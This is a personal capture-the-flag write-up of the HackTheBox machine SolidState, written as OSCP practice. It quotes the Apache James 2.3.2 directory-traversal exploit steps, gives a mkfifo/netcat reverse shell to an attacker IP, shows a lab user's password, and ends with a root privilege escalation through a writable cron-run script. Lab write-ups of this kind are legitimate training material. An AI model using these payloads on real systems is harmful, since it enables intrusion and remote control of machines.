
Name: SolidState
Date:  21/11/2022
Difficulty:  Medium
Goals:  OSCP Prep
Learnt:
- Learning to email like a boomer, regaining a mixture of respect and  
- Weird Ports are sometimes the  target and normality is rabbithole
- Rick Sanchez "Measure twice, cut once" - Read twice, cut once
- Telnet `ctrl + $escapekey` - harder than vim exiting for my brain.
- Linpeas is not everything 

Disclaimer I ran into the rsip protocol, the primilary exploit for this machine and walkthrough forgetting this a TJ Null box. I do not know the PrivEsc and di not read it. The challenge here would be very OSCP-esque recon or die; rerunning old recon attempts from long months past,  in the background being the other OSCP-esque methodological must for me returning to this box regardless of sort of knowing how the inital steps of this box are.  There is also a metasploit module for the intital phase of the box.

LiTTLe did I know this was going to be the equivent of Going Postal, except I just get kept in the cell till I eat the walls away with learn how to email people -  like real life. I am not an email person. Maybe one day I will be. Hopeful soon I will ajust to the discord server post covid world.

## Recon
The time to live(TTL) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![](HackTheBox/Retired-Machines/SolidState/Screenshots/ping.png)

Considering I already knew this stuff, but is not obvious to a random person trying this box. Just wait for prompts with nc. It makes no intuitive sense regardly, but these systems seem like a begone age that stil exist in the real world behind modern tech and teams.

![](waitforit.png)

Using default credentials
![](defaultcreds.png)

Public exploits avilabel for the [James 2.3.2](https://en.wikipedia.org/wiki/Apache_James) is the Java Apache Mail Enterprise Server, it manages the Apache Mailet API.
![](searchsploit.png)
I research the python3 version of the exploit that was unverified, which works, similiarly requires requires login. As all versions with cron.d wont work.

Metasploit exploit description: 
*"This module exploits a vulnerability that exists due to a lack of input validation when creating a user. Messages for a given user are stored in a directory partially defined by the username. By creating a user with a directory traversal payload as the username, commands can be written to a given directory. To use this module with the cron exploitation method, run the exploit using the given payload, host, and port. After running the exploit, the payload will be executed within 60 seconds. Due to differences in how cron may run in certain Linux operating systems such as Ubuntu, it may be preferable to set the target to Bash Completion as the cron method may not work. If the target is set to Bash completion, start a listener using the given payload, host, and port before running the exploit. After running the exploit, the payload will be executed when a user logs into the system. For this exploitation method, bash completion must be enabled to gain code execution. This exploitation method will leave an Apache James mail object artifact in the /etc/bash_completion.d directory and the malicious user account."*


The metasploit version; performs version checks, creates a user that will be receiving the payload 
```ruby
# The java Message objects for this user will now be stored in
# Either /etc/bash_completion.d or /etc/cron.d
# if it is a cron then
adduser ../../../../../../../../etc/$choice $password
# Delete mail objects containing payload from cron.d

# Then it send the payload to the 25 port
# connect to 25
ehlo admin@apache.com 
# added the extra quote to make this more readable in the line below!
mail from: <''@apache.com> 
rcpt to: ../../../../../../../../etc/cron.d # 60 secs its back
# RCPT TO command tells the SMTP mail server to who the message should be sent
data
From: admin@apache.com
```

References 
[Debug STMP connection for great description of SMTP commands that occuring exploitation of Mail servers](https://www.sparkpost.com/blog/how-to-check-an-smtp-connection-with-a-manual-telnet-session/)
[Metasploit Module](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/smtp/apache_james_exec.rb)

The non metasploit route requires Python2.7 and some modifications
![](exploitmodification.png)

I misread and assume the below. The `>` is required for the addressing format.
```bash
# These line we mistaken
Changes to the `rcpt to` and `adduser` commands as well as the payload, which initially failed. I checked with metasploit the default being with cron.d. **Note I did remove the `>` in s.send() line** and retest. 
```

```bash
# One window/pane to catch the cron
nc -lvnp 110
# One window/pane for second shell
nc -lvnp 111
# Reverse shell for the cron shell to paste in to save time
rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2>&1|nc 10.10.14.109 111 >/tmp/g
# Copy and wait...to paset
```

which initially failed, checked with metasploit the default being with cron.d - change payload as double check, but again it failed.
![](crondnotworking.png)

Therefore we have to find another way to get ssh login to the box and this would then lead to potential lead to root on the box. Reminder, but for linearities sake will testing options, I also researched the python3 version of the exploit that was unverified, which works, just requires login. 

Background hydra
![](hydrainthebackground.png)

Recon or die and therefore testing server for memory leakage on eol version of apache
![](checkingtheapache.png)
Ran multiple times and did `-n 100`; same result each time, is it not [Optionsbleed](https://nvd.nist.gov/vuln/detail/CVE-2017-9798), just the bug. It may be [Apache bug #61207](https://bz.apache.org/bugzilla/show_bug.cgi?id=61207).

Instead of climbing down to lesser quality hour, but using ZAP as I check everything except jquery versions as xxs is not really what is required or useful foothold on box CVE-2020-11023, CVE-2020-11022, CVE-2015-9251 and CVE-2019-11358. There are no parametres. I reset the box encase of any potential I may have errors.  I [peaked at both Ivan's](https://ivanitlearning.wordpress.com/2020/08/23/hackthebox-solidstate/) - saw "reading emails" subsection title  and was it and enough. My excuse/reasoning as to why is my confusion with a similar box like this were password resets made no difference it seemed. It also seems like a really unethical thing to do if you were pentesting or redteaming... I suppose you could change it back shortly after, but still. Nevermind. I have been training myself to be more "hunt the shine things" with THM AD Red teaming stuff and playing a bit of Hacknet. I am not as fixated by constant email/ social media checking as other people seem to be. I feel that this does not deserve demotion to helped-through, yet. But that was last strike. If need it again or change my mind this is here for the record.

So I did the thing...
![](reseteveryone.png)

To make it easy for my idiot self. Then I remembered that I put this:

Took this to double check mailing addresses in exploit - metasploit does not 
![](potential.png)
...in my notes for two reason, acted on check one, but not the other. My bad. Added Email to Noting Template. To remember. Then remember that port 25 is not 110...

```
VRFY james@solid-state-security.com
VRFY john@solid-state-security.com
VRFY thomas@solid-state-security.com
VRFY mindy@solid-state-security.com
VRFY mailadmin@solid-state-security.com
# I tried 
ehlo # my ip, there ip, solid-state-security.com
# All ERR
```

https://learn.microsoft.com/en-us/exchange/mail-flow/test-smtp-telnet?view=exchserver-2019

![](cluesinthemail.png)

As not fan of emails general it is rather strange that the old versions are **this clunky**. It been almost a year since I hacked email ports.

![](poormindy.png)

`mindy : P@55W0rd1!2@`


## Exploit  & Foothold &  PrivEsc

Mindy is not powerful enough to know herself.
![](mindyisnotpowerfulenoughtoknowherself.png)

So with all my tryharding, which is positive. I did not need to edit code. I did not need to really understand the vulnerability. I enumerate and almost died trying. If my cheatsheets were up to par on POP3 this would have been a breeze. 

![1000](scriptfailed.png)

Retried and boom
![](retriedandbooom.png)

![](env.png)

We need to escape the rbash shell. We sort of escape it as much as possible with exploit or 
`ssh -t "bash --noprofile"`
![](what.png)


There is no sudo on this box. James is on the box.

Linpeas list:

- no gcc or cc or make so no:
Vulnerable to CVE-2021-4034 
Potentially Vulnerable to CVE-2022-2588
Potential pwnkit.

chmod 777 the bin directory to enumerate. 
![](chmodingthebin.png)

127.0.0.1 631

`find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u`
/opt/tmp.py

Although I could not run pspy64 due to restricted shell this seems like a script that is scheduled with cronjob
![](tmptmp.png)

Copying a back up to /home/mindy I added a simple bash reverse shell.

![](reverseshellattempt.png)

Root
![](root.png)

